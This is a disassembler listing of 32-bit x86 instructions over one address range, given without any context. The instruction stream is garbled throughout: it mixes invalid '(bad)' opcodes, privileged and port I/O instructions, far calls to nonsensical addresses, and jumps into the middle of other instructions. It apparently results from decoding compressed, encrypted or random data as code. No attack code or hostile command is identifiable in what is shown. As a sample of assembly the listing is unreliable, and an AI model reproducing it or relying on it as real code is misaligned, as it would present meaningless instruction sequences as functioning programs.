  41ab29:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ab2a:	test   BYTE PTR [esi],dl
  41ab2c:	xor    edi,DWORD PTR [eax]
  41ab2e:	sub    bl,cl
  41ab30:	dec    edi
  41ab31:	fisub  WORD PTR [ecx+esi*2-0x18]
  41ab35:	cld    
  41ab36:	inc    esi
  41ab37:	dec    ecx
  41ab38:	xlat   BYTE PTR ds:[ebx]
  41ab39:	push   edi
  41ab3a:	push   es
  41ab3b:	mov    ecx,0x378f771e
  41ab40:	inc    edx
  41ab41:	fistp  QWORD PTR [ebx+0x7ea1761e]
  41ab47:	aas    
  41ab48:	daa    
  41ab49:	(bad)  
  41ab4a:	in     al,dx
  41ab4b:	mov    edx,DWORD PTR [edx+0x59]
  41ab4e:	sbb    eax,0xe75d5a5f
  41ab53:	mov    esp,0xde844949
  41ab58:	mov    edx,0x634a652e
  41ab5d:	jno    0x41ab9c
  41ab5f:	aad    0xbe
  41ab61:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ab62:	cld    
  41ab63:	mov    eax,ds:0xa8f83029
  41ab68:	add    dh,BYTE PTR [eax]
  41ab6a:	push   ecx
  41ab6b:	adc    BYTE PTR [ebx-0x1c1b0cce],bh
  41ab71:	int    0x4a
  41ab73:	retf   0x3ad9
  41ab76:	(bad)  
  41ab77:	push   edx
  41ab78:	cdq    
  41ab79:	and    esp,edi
  41ab7b:	mov    ah,0xe3
  41ab7d:	ret    0x85e7
  41ab80:	retf   0xb2fb
  41ab83:	mov    DWORD PTR [eax+0x1d],ebx
  41ab86:	stc    
  41ab87:	sbb    BYTE PTR [ebx+0x7a],0x32
  41ab8b:	and    al,0x55
  41ab8d:	jmp    0x41ab85
  41ab8f:	sub    eax,0xdb27e20f
  41ab94:	mov    dh,0xaf
  41ab96:	mov    cl,0x3
  41ab98:	call   DWORD PTR [esi+0x23]
  41ab9b:	rol    BYTE PTR [esi+0x19],0x63
  41ab9f:	shl    DWORD PTR [ecx],1
  41aba1:	sub    eax,0x47dd902b
  41aba6:	shl    DWORD PTR [esi],1
  41aba8:	popf   
  41aba9:	aam    0xa0
  41abab:	cld    
  41abac:	cwde   
  41abad:	je     0x41ab78
  41abaf:	ds push edx
  41abb1:	outs   dx,BYTE PTR ds:[esi]
  41abb2:	and    DWORD PTR [esi+0x45],eax
  41abb5:	cdq    
  41abb6:	ror    BYTE PTR [ecx+0x62],0x8f
  41abba:	out    0xa0,eax
  41abbc:	ret    0x809b
  41abbf:	jle    0x41ab4c
  41abc1:	push   cs
  41abc2:	xor    esp,DWORD PTR [ebx]
  41abc4:	add    dh,BYTE PTR ds:0x7533b812
  41abca:	pmuludq mm5,mm0
  41abcd:	aaa    
  41abce:	cwde   
  41abcf:	inc    ebp
  41abd0:	and    eax,0xb4bb6a99
  41abd5:	sbb    al,0x98
  41abd7:	xchg   ebp,eax
  41abd8:	push   0x593f46c2
  41abdd:	mov    dh,0x5b
  41abdf:	jl     0x41ab91
  41abe1:	mov    esp,0x3de8bcc4
  41abe6:	add    eax,edi
  41abe8:	hlt    
  41abe9:	cmc    
  41abea:	push   es
  41abeb:	xchg   ebp,eax
  41abec:	pop    es
  41abed:	js     0x41ac4a
  41abef:	jmp    0xa7e57db0
  41abf4:	fcom   st(5)
  41abf6:	add    edx,edx
  41abf8:	or     dl,BYTE PTR [eax-0xa]
  41abfb:	sbb    eax,0xf0d864fe
  41ac00:	out    dx,al
  41ac01:	gs xchg esi,eax
  41ac03:	icebp  
  41ac04:	aam    0x92
  41ac06:	mov    ebp,0xc594167e
  41ac0b:	jge    0x41ac77
  41ac0d:	sub    ah,BYTE PTR [eax-0x2b233e81]
  41ac13:	mov    DWORD PTR [eax-0x53],edi
  41ac16:	add    BYTE PTR [eax],ah
  41ac18:	stc    
  41ac19:	daa    
  41ac1a:	ins    BYTE PTR es:[edi],dx
  41ac1b:	cld    
  41ac1c:	xchg   esp,eax
  41ac1d:	pusha  
  41ac1e:	xchg   bl,ch
  41ac20:	outs   dx,DWORD PTR ds:[esi]
  41ac21:	es or  eax,0x9041541c
  41ac27:	js     0x41abbd
  41ac29:	dec    ebx
  41ac2a:	inc    edx
  41ac2b:	lods   eax,DWORD PTR ds:[esi]
  41ac2c:	aam    0x7
  41ac2e:	test   DWORD PTR [edi+0x3526cdca],0xa64f25c6
  41ac38:	out    0x70,al
  41ac3a:	push   ss
  41ac3b:	(bad)  
  41ac3c:	mov    ecx,0x786341a1
  41ac41:	cwde   
  41ac42:	fistp  DWORD PTR [ebx+0x6273f942]
  41ac48:	sub    bl,ah
  41ac4a:	test   eax,0xc63c124f
  41ac4f:	add    edx,edi
  41ac51:	pop    eax
  41ac52:	test   DWORD PTR cs:[ecx-0x5],edx
  41ac56:	pushf  
  41ac57:	and    BYTE PTR [edi],ah
  41ac59:	inc    ebx
  41ac5a:	aaa    
  41ac5b:	mov    ebp,0xab9eec81
  41ac60:	dec    ecx
  41ac61:	out    0x9,al
  41ac63:	mov    ds:0x8dfbc3eb,al
  41ac68:	push   es
  41ac69:	rol    edi,0x30
  41ac6c:	rcl    DWORD PTR [esi+ebp*8],cl
  41ac6f:	mov    dh,0xa3
  41ac71:	adc    dh,bh
  41ac73:	dec    edx
  41ac74:	xchg   DWORD PTR [edi+0x3f],eax
  41ac77:	test   eax,0xbdbc7ef2
  41ac7c:	jnp    0x41accd
  41ac7e:	xor    ch,BYTE PTR [ebx]
  41ac80:	push   ss
  41ac81:	mov    ebp,0x869419ec
  41ac86:	mov    dh,0xbf
  41ac88:	inc    ebp
  41ac89:	mov    ch,0xe3
  41ac8b:	popf   
  41ac8c:	cmp    eax,0xedb2b15c
  41ac91:	mov    ebp,0xd53ce654
  41ac96:	mov    bh,0x97
  41ac98:	lahf   
  41ac99:	in     al,0x5b
  41ac9b:	cli    
  41ac9c:	mov    WORD PTR [esi],gs
  41ac9e:	mov    eax,0xbfc22895
  41aca3:	cmp    bh,0xda
  41aca6:	mov    bl,0xb2
  41aca8:	add    esp,edi
  41acaa:	outs   dx,DWORD PTR ds:[esi]
  41acab:	add    edx,DWORD PTR [ecx-0x2b28e12b]
  41acb1:	xchg   esi,eax
  41acb2:	inc    esp
  41acb3:	mov    ecx,DWORD PTR [edi-0x3ffbf5bb]
  41acb9:	cmp    al,0x5b
  41acbb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41acbc:	xchg   esi,eax
  41acbd:	iret   
  41acbe:	test   BYTE PTR [ebx-0x52],cl
  41acc1:	mov    al,0xbe
  41acc3:	fist   DWORD PTR [eax-0x78]
  41acc6:	adc    esi,ebp
  41acc8:	sub    eax,0x28c666f8
  41accd:	repnz xor al,0xa7
  41acd0:	sar    BYTE PTR ds:0x10c134c,cl
  41acd6:	pop    edx
  41acd7:	cmp    ebx,DWORD PTR [edx]
  41acd9:	out    0x70,ax
  41acdc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41acdd:	ja     0x41ac65
  41acdf:	xchg   BYTE PTR [ecx+edi*8+0x6c83aa02],dh
  41ace6:	popf   
  41ace7:	inc    esp
  41ace8:	fimul  DWORD PTR [ebx+0x39b4d886]
  41acee:	imul   ecx,DWORD PTR [ebp+0x13ad422a],0x1c
  41acf5:	xor    bh,BYTE PTR [edi-0x267d166b]
  41acfb:	popf   
  41acfc:	dec    edi
  41acfd:	xchg   esi,eax
  41acfe:	pop    edi
  41acff:	sbb    DWORD PTR [eax+0x63c5fa72],esp
  41ad05:	xchg   ebp,eax
  41ad06:	jl     0x41ad04
  41ad08:	arpl   WORD PTR [esp+eiz*4-0x211d4cb9],dx
  41ad0f:	xor    ecx,DWORD PTR [edx+0x780b53c2]
  41ad15:	fs (bad) 
  41ad17:	inc    edi
  41ad18:	adc    DWORD PTR [esi+0x66],ebp
  41ad1b:	imul   edi,DWORD PTR [edx],0x70
  41ad1e:	daa    
  41ad1f:	les    edx,FWORD PTR [edi-0x13f2128e]
  41ad25:	sbb    al,0xd2
  41ad27:	iret   
  41ad28:	(bad)  
  41ad29:	jmp    0xa93b:0x45fc6ab7
  41ad30:	inc    edx
  41ad31:	test   ebx,ebx
  41ad33:	xor    DWORD PTR ds:0xc2adbceb,eax
  41ad39:	scas   al,BYTE PTR es:[edi]
  41ad3a:	out    dx,al
  41ad3b:	cmp    dh,BYTE PTR [edi-0x743a6898]
  41ad41:	or     BYTE PTR [esp+ebp*2+0x43],bl
  41ad45:	sub    ebx,eax
  41ad47:	repz (bad) 
  41ad49:	mov    ebp,0x922ef8e8
  41ad4e:	dec    ebx
  41ad4f:	push   ebp
  41ad50:	jmp    0x41ad16
  41ad52:	adc    cl,al
  41ad54:	shl    BYTE PTR [ebx],cl
  41ad56:	fidiv  DWORD PTR [eax]
  41ad58:	mov    BYTE PTR [ecx+0x23],al
  41ad5b:	repz push edx
  41ad5d:	adc    cl,BYTE PTR [edi]
  41ad5f:	jmp    0xed92d1c8
  41ad64:	daa    
  41ad65:	xor    DWORD PTR [edi+esi*1-0x1f],0x2e
  41ad6a:	daa    
  41ad6b:	xchg   BYTE PTR [ebx],bh
  41ad6d:	pop    es
  41ad6e:	jb     0x41ad51
  41ad70:	pop    ecx
  41ad71:	or     esp,DWORD PTR [ebx+0x60aa94d4]
  41ad77:	jne    0x41ad49
  41ad79:	aaa    
  41ad7a:	sbb    DWORD PTR ds:0xb348ae26,ecx
  41ad80:	dec    eax
  41ad81:	sub    ah,BYTE PTR [edx]
  41ad83:	mov    edi,0x8790dd42
  41ad88:	dec    eax
  41ad89:	push   ebx
  41ad8a:	xchg   esi,eax
  41ad8b:	cmp    ebp,ebp
  41ad8d:	leave  
  41ad8e:	push   0x51e106b3
  41ad93:	fistp  WORD PTR [edx-0x4266ffb6]
  41ad99:	into   
  41ad9a:	cmp    al,BYTE PTR [edx+edi*2]
  41ad9d:	sbb    al,0x61
  41ad9f:	and    ebp,ebx
  41ada1:	call   0xd86376bc
  41ada6:	enter  0xf58d,0x8d
  41adaa:	push   ss
  41adab:	sub    bh,ah
  41adad:	jb     0x41ade8
  41adaf:	jb     0x41adfb
  41adb1:	inc    eax
  41adb2:	je     0x41ad51
  41adb4:	ret    
  41adb5:	pop    edx
  41adb6:	jne    0x41ad6e
  41adb8:	and    eax,0x33a9c53a
  41adbd:	push   esp
  41adbe:	iret   
  41adbf:	clc    
  41adc0:	loopne 0x41ad4b
  41adc2:	int    0x69
  41adc4:	bnd jno 0x41ae0b
  41adc7:	and    ecx,DWORD PTR [esi+ebx*1-0x1c]
  41adcb:	cwde   
  41adcc:	or     edx,DWORD PTR [esi-0x49]
  41adcf:	in     al,0x7
  41add1:	mov    bh,0xd5
  41add3:	xchg   esi,eax
  41add4:	cli    
  41add5:	iret   
  41add6:	dec    ecx
  41add7:	fsubr  QWORD PTR [eax+0x6f881d3]
  41addd:	sub    eax,0x9eabe14
  41ade2:	stos   BYTE PTR es:[edi],al
  41ade3:	jl     0x41ae15
  41ade5:	xor    BYTE PTR [esi+0x60],bh
  41ade8:	adc    DWORD PTR [edi],esi
  41adea:	sahf   
  41adeb:	push   cs
  41adec:	inc    ebx
  41aded:	xchg   esp,eax
  41adee:	dec    esi
  41adef:	stc    
  41adf0:	fisttp DWORD PTR [ecx]
  41adf2:	retf   0xf2fd
  41adf5:	sbb    DWORD PTR [edi-0x75],eax
  41adf8:	in     eax,0x3b
  41adfa:	add    eax,0xd657b6dc
  41adff:	xchg   ebx,eax
  41ae00:	imul   edx,DWORD PTR [eax-0x46],0x4f3abdb1
  41ae07:	jg     0x41ae81
  41ae09:	mov    edi,0x79caa2b3
  41ae0e:	pop    ds
  41ae0f:	outs   dx,DWORD PTR ds:[esi]
  41ae10:	mov    ch,0xc0
  41ae12:	div    DWORD PTR [esi-0x7b]
  41ae15:	ins    DWORD PTR es:[edi],dx
  41ae16:	ds hlt 
  41ae18:	push   edx
  41ae19:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ae1a:	cmp    eax,0xb333520e
  41ae1f:	xor    al,0xda
  41ae21:	inc    ebp
  41ae22:	cmp    al,0x4d
  41ae24:	cmovbe esi,DWORD PTR [esi]
  41ae27:	gs mov edx,0x570f5360
  41ae2d:	xchg   edi,eax
  41ae2e:	pop    es
  41ae2f:	or     ebx,DWORD PTR [ebx-0x4862b683]
  41ae35:	bound  esi,QWORD PTR ds:0x6e105d0f
  41ae3b:	mov    ch,0x21
  41ae3d:	sti    
  41ae3e:	add    al,0x7
  41ae40:	test   al,0xc1
  41ae42:	dec    edx
  41ae43:	stc    
  41ae44:	jae    0x41ae23
  41ae46:	jecxz  0x41ae4a
  41ae48:	cmp    dl,BYTE PTR [eax]
  41ae4a:	mov    edx,0xc4c98fae
  41ae4f:	mov    dh,0x26
  41ae51:	mov    edi,0x3b5eb788
  41ae56:	out    0xcf,al
  41ae58:	pop    es
  41ae59:	mov    dl,0x31
  41ae5b:	and    ch,BYTE PTR [ecx]
  41ae5d:	push   esi
  41ae5e:	push   esi
  41ae5f:	inc    esi
  41ae60:	or     bh,BYTE PTR [ebx]
  41ae62:	sahf   
  41ae63:	pop    esi
  41ae64:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ae65:	mov    esi,0x80b9d89c
  41ae6a:	pop    edx
  41ae6b:	out    dx,al
  41ae6c:	push   0xd1440ee4
  41ae71:	bnd jle 0x41aed3
  41ae74:	xlat   BYTE PTR ds:[ebx]
  41ae75:	cmp    edi,DWORD PTR [edi-0x6b]
  41ae78:	mov    ebp,0xebdc6dd3
  41ae7d:	mov    ebx,0x8999ab3f
  41ae82:	call   0xc58eda26
  41ae87:	push   DWORD PTR [edx+0x6683fb95]
  41ae8d:	or     bh,0xb1
  41ae90:	stos   DWORD PTR es:[edi],eax
  41ae91:	adc    ch,BYTE PTR [eax+esi*4-0x2727277b]
  41ae98:	stc    
  41ae99:	(bad)  
  41ae9a:	iret   
  41ae9b:	push   ds
  41ae9c:	jp     0x41ae93
  41ae9e:	mov    eax,ds:0xb88f544f
  41aea3:	sbb    bl,BYTE PTR [ebx-0x5]
  41aea6:	xchg   ebp,eax
  41aea7:	pop    ss
  41aea8:	mov    ch,0x5
  41aeaa:	sti    
  41aeab:	push   eax
  41aeac:	leave  
  41aead:	push   ebp
  41aeae:	ror    DWORD PTR [eax-0x686db149],0x15
  41aeb5:	enter  0xccbd,0x7c
  41aeb9:	jnp    0x41aedf
  41aebb:	sbb    esp,DWORD PTR [edx-0x619c915d]
  41aec1:	scas   eax,DWORD PTR es:[edi]
  41aec2:	arpl   dx,ax
  41aec4:	loope  0x41ae5a
  41aec6:	lahf   
  41aec7:	test   eax,0xe07e848a
  41aecc:	cmp    eax,0xdf659b66
  41aed1:	and    bh,BYTE PTR [ebx+0x63]
  41aed4:	xchg   edi,eax
  41aed5:	push   0xbac94177
  41aeda:	push   cs
  41aedb:	mov    bl,0x69
  41aedd:	rcl    DWORD PTR [esi],1
  41aedf:	aam    0x9
  41aee1:	xlat   BYTE PTR ds:[ebx]
  41aee2:	ins    BYTE PTR es:[edi],dx
  41aee3:	jno    0x41ae91
  41aee5:	repz ret 
  41aee7:	mov    bl,0x1d
  41aee9:	aas    
  41aeea:	or     bl,BYTE PTR [ebx-0x73cd2805]
  41aef0:	leave  
  41aef1:	push   ss
  41aef2:	pop    eax
  41aef3:	sbb    al,0x91
  41aef5:	add    DWORD PTR [ecx+eax*2],0xb
  41aef9:	aaa    
  41aefa:	repnz inc ebp
  41aefc:	lea    ecx,[eax+0x2f]
  41aeff:	cwde   
  41af00:	(bad)  
  41af01:	leave  
  41af02:	div    DWORD PTR [esi-0x3a]
  41af05:	dec    eax
  41af06:	ins    BYTE PTR es:[edi],dx
  41af07:	xchg   BYTE PTR [eax-0x5d],ch
  41af0a:	jge    0x41aed8
  41af0c:	sti    
  41af0d:	dec    edi
  41af0e:	popa   
  41af0f:	cmp    BYTE PTR [ebx],ah
  41af11:	das    
  41af12:	xchg   ah,ch
  41af14:	iret   
  41af15:	in     al,0x85
  41af17:	cmp    DWORD PTR [ecx-0x3c],ebp
  41af1a:	xchg   edi,eax
  41af1b:	ins    BYTE PTR es:[edi],dx
  41af1c:	bswap  esp
  41af1e:	lods   eax,DWORD PTR es:[esi]
  41af20:	stc    
  41af21:	call   0x3886:0xfb1ce752
  41af28:	mov    ds:0xecd5f78a,eax
  41af2d:	mov    edx,0x2f883736
  41af32:	les    esp,FWORD PTR [esp+ebp*8+0x7e262648]
  41af39:	mov    al,0x95
  41af3b:	lahf   
  41af3c:	mov    db6,esi
  41af3f:	mov    ebp,ecx
  41af41:	sub    al,0xa3
  41af43:	pop    eax
  41af44:	aad    0xef
  41af46:	nop
  41af47:	push   cs
  41af48:	outs   dx,DWORD PTR ds:[esi]
  41af49:	lock dec eax
  41af4b:	add    eax,0xad163c83
  41af50:	mov    ch,0xcb
  41af52:	sbb    edx,esi
  41af54:	mov    ecx,0x4d2c3f02
  41af59:	stos   BYTE PTR es:[edi],al
  41af5a:	xchg   ebx,eax
  41af5b:	sar    DWORD PTR [eax],1
  41af5d:	fidivr DWORD PTR [ebx-0xc]
  41af60:	les    eax,FWORD PTR [edx+0x71c8dc5d]
  41af66:	ficomp WORD PTR [edi+0x6f]
  41af69:	inc    ebp
  41af6a:	ret    0xf196
  41af6d:	mov    ah,0x54
  41af6f:	in     eax,dx
  41af70:	in     al,dx
  41af71:	mov    ebp,0x2ca89221
  41af76:	add    ecx,DWORD PTR [esi]
  41af78:	jge    0x41af14
  41af7a:	mov    ds:0xfff2c4d8,eax
  41af7f:	fstp   TBYTE PTR [eax+0x11]
  41af82:	sub    DWORD PTR [edx+0x68],eax
  41af85:	lods   eax,DWORD PTR ds:[esi]
  41af86:	faddp  st(7),st
  41af88:	mov    esp,0xe3043909
  41af8d:	cdq    
  41af8e:	push   esi
  41af8f:	adc    al,0x2c
  41af91:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41af92:	add    BYTE PTR [eax+0x2d],0x5b
  41af96:	or     al,0xda
  41af98:	rcr    BYTE PTR [ecx+0x16],0x1b
  41af9c:	scas   eax,DWORD PTR es:[edi]
  41af9d:	ja     0x41af4b
  41af9f:	xchg   esp,eax
  41afa0:	fstp   QWORD PTR [ecx-0x654a2cfc]
  41afa6:	call   0xf114:0x6217b9c1
  41afad:	xor    DWORD PTR [edx],0xffffffd4
  41afb0:	or     ah,BYTE PTR [edi+0x5f64653f]
  41afb6:	sub    BYTE PTR [eax+0x38],cl
  41afb9:	or     BYTE PTR [esi+ebx*2-0x41],ah
  41afbd:	call   0x9b12:0x8b209df
  41afc4:	pop    esp
  41afc5:	cmp    cl,ah
  41afc7:	outs   dx,BYTE PTR ds:[esi]
  41afc8:	and    cl,cl
  41afca:	adc    DWORD PTR [ecx*1-0x57a1ae7d],ebx
  41afd1:	int3   
  41afd2:	or     eax,0x20a0d5f8
  41afd7:	mov    al,ds:0x912a6056
  41afdc:	aas    
  41afdd:	add    cl,dl
  41afdf:	push   0xffffffe3
  41afe1:	push   esp
  41afe2:	rcl    BYTE PTR gs:[eax],cl
  41afe5:	xchg   edx,eax
  41afe6:	pushf  
  41afe7:	fs sub cl,dh
  41afea:	pop    ds
  41afeb:	imul   edi,esi,0xb
  41afee:	cmp    ebp,DWORD PTR [ebp+ebx*8+0x4]
  41aff2:	dec    esi
  41aff3:	sub    DWORD PTR [eax],ecx
  41aff5:	gs icebp 
  41aff7:	dec    edi
  41aff8:	rdmsr  
  41affa:	(bad)  
  41affb:	mov    dl,0x64
  41affd:	lea    eax,[ecx+0x69]
  41b000:	iret   
  41b001:	inc    eax
  41b002:	adc    eax,0x337b2c90
  41b007:	fild   WORD PTR ds:[eax+0x10]
  41b00b:	pop    edx
  41b00c:	call   0xbba5:0xcbc88197
  41b013:	adc    BYTE PTR [eax],dh
  41b015:	xchg   ecx,eax
  41b016:	lods   al,BYTE PTR ds:[esi]
  41b017:	ret    0xa040
  41b01a:	hlt    
  41b01b:	es mov ch,0x4b
  41b01e:	sub    bh,BYTE PTR [esi-0x73]
  41b021:	add    BYTE PTR [edx],0xe7
  41b024:	pop    esi
  41b025:	jl     0x41afe4
  41b027:	push   esp
  41b028:	daa    
  41b029:	(bad)  
  41b02a:	je     0x41b04f
  41b02c:	iret   
  41b02d:	lds    esi,FWORD PTR [ebp+ebp*8+0x19]
  41b031:	ins    BYTE PTR es:[edi],dx
  41b032:	mov    al,ds:0x9c229908
  41b037:	push   es
  41b038:	fbstp  TBYTE PTR [ebx+edx*2+0x1a6c28a5]
  41b03f:	sub    DWORD PTR [ecx-0x79],eax
  41b042:	mov    ds:0x246f0eff,al
  41b047:	imul   eax,DWORD PTR [edi-0x8],0xffffffa8
  41b04b:	xor    eax,0x8a72d61d
  41b050:	popa   
  41b051:	mov    ss,WORD PTR [ebx+eax*4]
  41b054:	inc    ecx
  41b055:	mov    ah,0xb6
  41b057:	inc    ebp
  41b058:	les    edi,FWORD PTR [eax]
  41b05a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b05b:	std    
  41b05c:	jnp    0x41b064
  41b05e:	mov    ds:0x79657da6,al
  41b063:	mov    eax,ds:0xf4ee9778
  41b068:	sbb    al,0x83
  41b06a:	sub    ebp,DWORD PTR [edi+0x5a]
  41b06d:	psrlw  mm6,QWORD PTR [ebx+0xeb0882d]
  41b074:	lock xor dl,BYTE PTR fs:[ecx]
  41b078:	hlt    
  41b079:	in     al,dx
  41b07a:	sbb    al,0xab
  41b07c:	or     dl,bl
  41b07e:	adc    eax,DWORD PTR [edi+0x44]
  41b081:	iret   
  41b082:	mov    eax,ds:0xd8c36456
  41b087:	sti    
  41b088:	or     bl,bh
  41b08a:	push   0xe8a4bcde
  41b08f:	iret   
  41b090:	repz mov al,ds:0x6b518313
  41b096:	jecxz  0x41b020
  41b098:	mov    WORD PTR [edx],?
  41b09a:	xor    ecx,DWORD PTR [edx]
  41b09c:	dec    BYTE PTR [esi-0xff48bd2]
  41b0a2:	fcmovnb st,st(5)
  41b0a4:	test   al,0x27
  41b0a6:	les    ebx,FWORD PTR [ebx-0x3a]
  41b0a9:	sub    BYTE PTR [esi],0x5
  41b0ac:	sbb    dh,0xcc
  41b0af:	adc    al,0x5e
  41b0b1:	fst    QWORD PTR [ebp-0x7a0f246a]
  41b0b7:	mov    al,BYTE PTR [ecx+0x61]
  41b0ba:	push   eax
  41b0bb:	hlt    
  41b0bc:	out    0xbf,al
  41b0be:	adc    dl,dl
  41b0c0:	lods   al,BYTE PTR ds:[esi]
  41b0c1:	into   
  41b0c2:	std    
  41b0c3:	test   DWORD PTR ds:0x9afec966,0x6398de57
  41b0cd:	aam    0x42
  41b0cf:	or     eax,0x93e239c5
  41b0d4:	aam    0x30
  41b0d6:	cmp    ch,BYTE PTR [edx+0x13]
  41b0d9:	or     ebp,eax
  41b0db:	cld    
  41b0dc:	call   0x1ccf:0xdd13c1b6
  41b0e3:	clc    
  41b0e4:	pusha  
  41b0e5:	and    DWORD PTR [ebp+0x49],edx
  41b0e8:	jecxz  0x41b0cf
  41b0ea:	lods   eax,DWORD PTR ds:[esi]
  41b0eb:	jae    0x41b120
  41b0ed:	imul   eax,DWORD PTR cs:[eax-0x14],0xb4f98554
  41b0f5:	retf   0x3cc6
  41b0f8:	and    BYTE PTR [edx+0x5b],bh
  41b0fb:	jmp    0x6d0b5d93
  41b100:	pop    ebp
  41b101:	sti    
  41b102:	pop    ss
  41b103:	pop    eax
  41b104:	mov    ds:0x3f06cdfb,al
  41b109:	in     eax,0x14
  41b10b:	mov    ebx,0xb4ee5471
  41b110:	das    
  41b111:	fsubr  QWORD PTR [esi]
  41b113:	in     al,0xfe
  41b115:	loopne 0x41b0a8
  41b117:	and    BYTE PTR [ebx+0x38],ah
  41b11a:	mov    esp,0x467367a8
  41b11f:	dec    edx
  41b120:	push   ecx
  41b121:	call   0x5878fb9e
  41b126:	int3   
  41b127:	test   eax,0x76a8fd6c
  41b12c:	loope  0x41b1a4
  41b12e:	dec    esi
  41b12f:	icebp  
  41b130:	sahf   
  41b131:	pop    ds
  41b132:	data16 aaa 
  41b134:	pop    ss
  41b135:	xor    al,0x6f
  41b137:	in     al,dx
  41b138:	jle    0x41b160
  41b13a:	mov    ch,0x1b
  41b13c:	jmp    0x660f4dbd
  41b141:	and    al,0xf2
  41b143:	sbb    bl,dl
  41b145:	mov    ah,0xa6
  41b147:	lock not DWORD PTR [edi+0x36]
  41b14b:	shr    DWORD PTR [ecx+eax*2-0x7a],cl
  41b14f:	pusha  
  41b150:	mov    gs,ebp
  41b152:	jmp    0x176d2b58
  41b157:	add    BYTE PTR [ebx],al
  41b159:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b15a:	fldenv [esi-0x4345f05e]
  41b160:	fwait
  41b161:	xchg   ebx,eax
  41b162:	(bad)  
  41b163:	test   al,0x2a
  41b165:	add    BYTE PTR [ebp+edi*2+0x37],0xb
  41b16a:	call   0xa0d1199d
  41b16f:	xchg   ecx,eax
  41b170:	xchg   ecx,eax
  41b171:	xchg   ebp,eax
  41b172:	pusha  
  41b173:	jmp    0x5388b977
  41b178:	mul    BYTE PTR [eax-0x42f24927]
  41b17e:	mov    bh,0xdb
  41b180:	mov    ch,0xfd
  41b182:	adc    ah,0x1d
  41b185:	mov    cl,0xe8
  41b187:	push   esi
  41b188:	push   ds
  41b189:	and    al,0x40
  41b18b:	into   
  41b18c:	jl     0x41b1ba
  41b18e:	xor    DWORD PTR [ebx+ebp*2+0x19ce3b1f],esi
  41b195:	(bad)
  41b199:	jns    0x41b1ab
  41b19b:	ja     0x41b13b
  41b19d:	push   esi
  41b19e:	jae    0x41b17e
  41b1a0:	pop    esi
  41b1a1:	push   esi
  41b1a2:	mov    ebp,0xb5406314
  41b1a7:	xor    dl,BYTE PTR [edi+0x3]
  41b1aa:	sbb    ebx,DWORD PTR [esi-0x25]
  41b1ad:	cmp    al,0x8d
  41b1af:	adc    al,BYTE PTR [eax]
  41b1b1:	out    0xe5,eax
  41b1b3:	jmp    0x6891:0x92d7c7c9
  41b1ba:	(bad)  
  41b1bb:	outs   dx,BYTE PTR ds:[esi]
  41b1bc:	inc    ebx
  41b1bd:	jge    0x41b17c
  41b1bf:	ja     0x41b1ff
  41b1c1:	xchg   edi,eax
  41b1c2:	jle    0x41b20e
  41b1c4:	mov    ah,0xcd
  41b1c6:	(bad)  
  41b1c7:	pop    ebp
  41b1c8:	xchg   esp,eax
  41b1c9:	lock fucomip st,st(2)
  41b1cc:	jo     0x41b182
  41b1ce:	bound  edx,QWORD PTR [esi+ebp*1-0x264fed36]
  41b1d5:	enter  0x4edf,0x82
  41b1d9:	sub    al,0x46
  41b1db:	push   ebp
  41b1dc:	lea    edx,[eax+0x1c]
  41b1df:	or     eax,DWORD PTR [edi-0x38]
  41b1e2:	mov    ecx,gs
  41b1e4:	xchg   ecx,eax
  41b1e5:	sbb    DWORD PTR [ecx],ebp
  41b1e7:	xchg   ebx,eax
  41b1e8:	call   0x9c60259a
  41b1ed:	aad    0x86
  41b1ef:	cwde   
  41b1f0:	test   DWORD PTR [edx],ebx
  41b1f2:	adc    BYTE PTR [edi+0x46],bl
  41b1f5:	pop    esp
  41b1f6:	inc    edx
  41b1f7:	in     al,0x1f
  41b1f9:	vpcmpeqd xmm3,xmm5,xmm5
  41b1fd:	adc    dl,BYTE PTR [edi]
  41b1ff:	enter  0xe3f4,0xbd
  41b203:	add    BYTE PTR [ecx-0xd86cfc8],bl
  41b209:	mov    cl,0x7
  41b20b:	ror    edx,0x56
  41b20e:	fnstcw WORD PTR [ebx+0x36]
  41b211:	jbe    0x41b284
  41b213:	jb     0x41b23c
  41b215:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b216:	aad    0xf0
  41b218:	and    al,0xb4
  41b21a:	pusha  
  41b21b:	xchg   bl,al
  41b21d:	inc    edi
  41b21e:	sbb    dh,BYTE PTR [edi]
  41b220:	xchg   ebx,eax
  41b221:	out    0x32,al
  41b223:	mov    eax,0x53e53a5e
  41b228:	push   esi
  41b229:	push   esp
  41b22a:	sub    BYTE PTR [ecx+0x6a5d0c3d],ah
  41b230:	mov    al,ds:0x7afa4289
  41b235:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b236:	clc    
  41b237:	test   al,0x49
  41b239:	mul    DWORD PTR [eax+0x6f]
  41b23c:	fbld   TBYTE PTR [edx-0x5a973ec5]
  41b242:	mov    ?,WORD PTR [eax]
  41b244:	add    eax,0xd20dc60b
  41b249:	pop    es
  41b24a:	fimul  WORD PTR [ebx]
  41b24c:	ficom  DWORD PTR [esi-0x4230b3e]
  41b252:	out    0x4c,eax
  41b254:	in     al,0x89
  41b256:	aad    0x10
  41b258:	addr16 pop edi
  41b25a:	loope  0x41b270
  41b25c:	push   eax
  41b25d:	(bad)  
  41b25e:	push   ds
  41b25f:	mov    esp,0xdfb5c15f
  41b264:	inc    esi
  41b265:	mov    al,ds:0x41871a0f
  41b26a:	mov    edi,0x3f9410c5
  41b26f:	icebp  
  41b270:	arpl   si,ax
  41b272:	xor    eax,0x8ef8f238
  41b277:	xor    ecx,DWORD PTR [esi-0x1917a79d]
  41b27d:	fisttp WORD PTR [ecx+0x314cc9a2]
  41b283:	aas    
  41b284:	pop    eax
  41b285:	push   cs
  41b286:	out    0x23,al
  41b288:	enter  0xbe4b,0xae
  41b28c:	push   eax
  41b28d:	cmp    BYTE PTR [edi+eiz*1+0x72104644],bh
  41b294:	fucomp st(1)
  41b296:	ror    ecx,0xd6
  41b299:	fdivr  QWORD PTR [esi+0x1bba0e75]
  41b29f:	sti    
  41b2a0:	inc    ebp
  41b2a1:	into   
